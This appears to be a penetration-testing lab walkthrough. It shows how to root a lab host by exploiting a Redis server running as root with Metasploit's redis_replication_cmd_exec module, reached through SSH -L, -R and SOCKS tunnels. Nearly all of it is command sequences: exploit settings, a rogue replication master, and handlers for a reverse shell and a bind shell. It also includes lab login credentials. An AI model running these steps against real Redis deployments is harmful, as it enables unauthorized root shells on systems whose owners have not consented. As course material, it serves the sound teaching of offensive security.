
### 5.1 Reverse shell payload
After ssh-ing into target1, elevate your privileges to root. If you want to try and root target1 without any hints, nowâ€™s your chance. Do not worry if you crush the service, it will automatically restart so you can try again. Otherwise, scroll down for more details. Please double check your proxychains settings as outlined in the "Install proxychains4" section.

credentials dory / justkeepswimming

We are going to exploit the redis server running as root that is listening on 127.0.0.1:6379. There are two options to setup tunnels. If you do not want to modify your /etc/proxychains4.conf file, use -L tunnels (option 1). 

#### Method 1

```
ssh $USER@$JB1 -L 2222:$TARGET1:22
```

From Kali, ssh into target1 and setup the tunnels to exploit. You can optionally supply the proxychains4 config file using -f /etc/proxychains4.conf. The -L tunnel allows us to access and exploit the redis service, and the two -R tunnels are for the malicious Master server and payload callback, respectively.

```
export USER2=dory
```

```
ssh $USER2@127.0.0.1 -p 2222 -L 6379:127.0.0.1:6379 -R 4444:127.0.0.1:4444 -R 5555:127.0.0.1:5555
```

```
nmap -sV -Pn -n 127.0.0.1 -p 6379
```

Continue with [[5._Linux Exploitation#Metasploit - Reverse Shell]]


#### Method 2

If you want to use a -D SOCKS tunnel (option 2), you will need to uncomment the `localnet 127.0.0.1/255.255.255.0` line in your /etc/proxychains4.conf file so it looks like the one below. This tells proxychains to not use the SOCKS proxy for any traffic hitting 127.0.0.1 on your Kali box.

![[Pasted image 20220430090252.png]]

credentials dory / justkeepswimming

```
ssh $USER@$JB1 -D 9050
```

```
proxychains4 ssh dory@$TARGET1 -L 6379:127.0.0.1:6379 -R 4444:127.0.0.1:4444 -R 5555:127.0.0.1:5555
```

```
nmap -sV -Pn -n 127.0.0.1 -p 6379
```

Continue with [[5._Linux Exploitation#Metasploit - Reverse Shell]]

#### Metasploit - Reverse Shell

SHELL 1:
```
sudo msfdb run
```

Specify the exploit to use.
```
use exploit/linux/redis/redis_replication_cmd_exec
```

Leverage a -L forward tunnel to access the redis service.
```
set RHOSTS 127.0.0.1
```

```
set RPORT 6379
```

Leverage a -R port forward to act as the malicious Master server.  This tells target1 to callback to itself , riding the -R 4444 tunnel back to the Kali host.
```
set SRVHOST 127.0.0.1
```

```
set SRVPORT 4444
```

```
set PAYLOAD linux/x64/shell_reverse_tcp
```

Configure the payload to call back to target1 itself, riding the -R 5555 tunnel back to the Kali host.
```
set LHOST 127.0.0.1
```

```
set LPORT 5555
```

The callback will be handled by a separate payloadhandler, so disable it in this msfconsole.
```
set DisablePayloadHandler True
```

Double check everything.
```
show options
```

SHELL 2:
```
sudo msfdb run
```

Start a generic payload handler.
```
use exploit/multi/handler
```

```
set PAYLOAD linux/x64/shell_reverse_tcp
```

```
set LPORT 5555
```

```
set LHOST 127.0.0.1
```

```
show options
```

```
run
```

SHELL 1:
```
check
```

```
exploit
```

### 5.2 Bind shell payload

Same as previous exercise, but configure the payload to be a bind shell.

We are going to exploit the redis server running as root that is listening on 127.0.0.1:6379. There are two options to setup tunnels. If you do not want to modify your /etc/proxychains4.conf file, use -L tunnels (option 1). 

credentials dory / justkeepswimming

#### Method 1
```
ssh $USER@$JB1 -L 2222:$TARGET1:22
```

```
export USER2=dory
```

```
ssh $USER2@127.0.0.1 -p 2222 -L 6379:127.0.0.1:6379 -R 4444:127.0.0.1:4444 -L 6666:127.0.0.1:6666
```

```
nmap -sV -Pn -n 127.0.0.1 -p 6379
```

Continue with [[5._Linux Exploitation#Metasploit - Bind Shell]]

#### Method 2

If you want to use a -D SOCKS tunnel (option 2), you will need to uncomment the localnet 127.0.0.1/255.255.255.0 line in your /etc/proxychains4.conf file so it looks like the one below. This tells proxychains to not use the SOCKS proxy for any traffic hitting 127.0.0.1 on your Kali box.

credentials dory / justkeepswimming

```
proxychains4 ssh dory@$TARGET1 -L 6379:127.0.0.1:6379 -R 4444:127.0.0.1:4444 -R 6666:127.0.0.1:6666
```

```
nmap -sV -Pn -n 127.0.0.1 -p 6379
```

Continue with [[5._Linux Exploitation#Metasploit - Bind Shell]]

#### Metasploit - Bind Shell

SHELL 1:
```
sudo msfdb run
```

Specify the exploit to use.
```
use exploit/linux/redis/redis_replication_cmd_exec
```

Leverage a -L forward tunnel to access the redis service.
```
set RHOSTS 127.0.0.1
```

```
set RPORT 6379
```

Leverage a -R port forward to act as the malicious Master server.  This tells target1 to callback to itself , riding the -R 4444 tunnel back to the Kali host.
```
set SRVHOST 127.0.0.1
```

```
set SRVPORT 4444
```

```
set PAYLOAD linux/x64/shell_bind_tcp
```

Configure the payload to listen on target1's 127.0.0.1 interface.
```
set RHOST 127.0.0.1
```

```
set LPORT 6666
```

The callback will be handled by a separate payloadhandler, so disable it in this msfconsole.
```
set DisablePayloadHandler True
```

Double check everything.
```
show options
```

```
exploit
```

SHELL 2:
```
sudo msfdb run
```

Start a generic payload handler.
```
use exploit/multi/handler
```

```
set payload linux/x64/shell_bind_tcp
```

```
set LPORT 6666
```

```
set RHOST 127.0.0.1
```

```
show options
```

```
run
```
